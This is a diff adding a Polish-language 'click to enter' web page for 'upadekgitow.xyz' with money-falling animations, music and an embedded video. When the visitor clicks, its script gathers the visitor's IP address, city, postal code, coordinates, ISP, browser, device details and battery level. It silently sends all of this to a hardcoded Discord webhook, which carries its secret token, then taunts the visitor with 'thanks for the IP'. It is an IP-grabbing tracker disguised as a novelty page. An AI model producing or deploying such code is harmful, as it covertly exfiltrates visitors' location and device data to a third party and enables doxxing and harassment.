@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        body {
+            background-color: black;
+            cursor: url('card.cur'), auto;
+            height: 100vh;
+            overflow: hidden;
+            margin: 0;
+        }
+
+        .money {
+            position: absolute;
+            width: 144px;
+            height: 140px;
+            background-image: url('money.webp');
+            background-size: cover;
+            transform: scale(0.15);
+            transform-origin: center;
+        }
+
+        .click-to-enter {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 16px;
+            color: white;
+            text-shadow: 0 0 10px white;
+            cursor: pointer;
+        }
+
+        #info {
+            display: none;
+            width: 80%;
+            max-width: 55ch;
+            margin: 20px auto;
+            border: 1px solid #ccc;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.8);
+            color: black;
+            text-align: center;
+        }
+
+        .label {
+            font-weight: bold;
+        }
+
+        iframe {
+            position: fixed;
+            right: 0;
+            bottom: 0;
+            min-width: 100%;
+            min-height: 100%;
+            display: none; /* Initially hidden */
+            z-index: -1;
+            border: none;
+        }
+    </style>
+    <title>upadekgitow.xyz</title>
+</head>
+<body>
+
+<div class="click-to-enter">CLICK TO ENTER</div>
+
+<div id="info"></div>
+
+<iframe id="myVideo" src="https://www.youtube.com/embed/4u4Z-86TSOk?autoplay=1&controls=0&modestbranding=1&showinfo=0&autohide=1&mute=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+<script>
+    let lastTime = 0;
+    let animationActive = true;
+
+    window.addEventListener('mousemove', (event) => {
+        if (animationActive) {
+            const now = Date.now();
+            if (now - lastTime > 70) {
+                createMoney(event.clientX, event.clientY);
+                lastTime = now;
+            }
+        }
+    });
+
+    function createMoney(x, y) {
+        const money = document.createElement('div');
+        money.classList.add('money');
+        document.body.appendChild(money);
+
+        const moneyWidth = money.offsetWidth;
+        const moneyHeight = money.offsetHeight;
+        const offsetX = moneyWidth / 2;
+        const offsetY = moneyHeight / 2;
+
+        const shiftRight = 15;
+        const shiftDown = 3;
+
+        gsap.set(money, {
+            x: x - offsetX + shiftRight,
+            y: y - offsetY + shiftDown,
+            opacity: 0
+        });
+
+        gsap.to(money, {
+            duration: 0.5,
+            opacity: 1,
+        });
+
+        gsap.to(money, {
+            duration: 2,
+            y: window.innerHeight + 50,
+            rotation: gsap.utils.random(-360, 360),
+            ease: 'power1.inOut',
+            onComplete: () => {
+                money.remove();
+            }
+        });
+    }
+
+    const clickToEnter = document.querySelector('.click-to-enter');
+    const infoDiv = document.getElementById('info');
+
+    function displayInfo(label, value) {
+        const p = document.createElement('p');
+        p.innerHTML = `<span class="label">${label}:</span> ${value}`;
+        infoDiv.appendChild(p);
+    }
+
+    async function getBatteryInfo() {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            return battery.level * 100 + '%';
+        }
+        return 'Battery information not available';
+    }
+
+    clickToEnter.addEventListener('click', async () => {
+        document.title = 'DZIĘKI ZA IP 😂😂😂';
+
+        const audio = new Audio('music.mp3');
+        audio.play().catch(() => {});
+
+        document.body.style.backgroundColor = 'white';
+        document.body.style.cursor = 'auto';
+        animationActive = false;
+
+        const moneyElements = document.querySelectorAll('.money');
+        moneyElements.forEach(money => {
+            money.style.display = 'none';
+        });
+
+        const batteryPercentage = await getBatteryInfo();
+
+        const systemInfo = {
+            'Nazwa przeglądarki': navigator.userAgent,
+            'Nazwa platformy': navigator.platform,
+            'Wersja przeglądarki': navigator.appVersion,
+            'Czy to telefon lub tablet': /Mobi|Android/i.test(navigator.userAgent) ? 'Tak' : 'Nie',
+            'Język systemowy': navigator.language,
+            'Rozdzielczość ekranu': screen.width + ' x ' + screen.height,
+            'Display pixel depth': screen.pixelDepth,
+            'Orientacja ekranu': screen.orientation.type,
+            'Rdzenie procesora': navigator.hardwareConcurrency,
+            'Dostępna pamięć przeglądarki': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Informacja niedostępna',
+        };
+
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const orderedInfo = {
+                    'Adres IP': data.ip,
+                    'Kraj': data.country_name,
+                    'Region': data.region,
+                    'Miasto': data.city,
+                    'Kod pocztowy': data.postal,
+                    'Pełna lokalizacja': data.latitude + ', ' + data.longitude,
+                    ...systemInfo,
+                    'Strefa czasowa': data.timezone,
+                    'Aktualna godzina': new Date().toLocaleString('pl-PL', { timeZone: data.timezone }),
+                    'ISP': data.org,
+                    'Poziom baterii': batteryPercentage,
+                };
+
+                sendToWebhook(orderedInfo);
+
+                let delay = 0;
+
+                for (const [key, value] of Object.entries(orderedInfo)) {
+                    if (key !== 'Poziom baterii') {
+                        setTimeout(() => {
+                            displayInfo(key, value);
+                        }, delay);
+                        delay += 200;
+                    }
+                }
+
+                document.getElementById('myVideo').style.display = 'block';
+            })
+            .catch(() => {});
+
+        clickToEnter.style.display = 'none';
+        infoDiv.style.display = 'block';
+    });
+
+    function sendToWebhook(systemInfo) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1274702152404701236/sCwXwygr7_W8pwJPvzlUCdB3OJ5sz7VIG88GfWlK__mPKquOTHXnhPRFC6nIqXRRohQu';
+
+        const embed = {
+            title: 'Informacje o systemie',
+            color: 16711680,
+            fields: [],
+        };
+
+        for (const [key, value] of Object.entries(systemInfo)) {
+            embed.fields.push({
+                name: key,
+                value: value,
+                inline: true,
+            });
+        }
+
+        if (webhookUrl) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ embeds: [embed] }),
+            }).catch(() => {});
+        }
+    }
+</script>
+</body>
+</html>
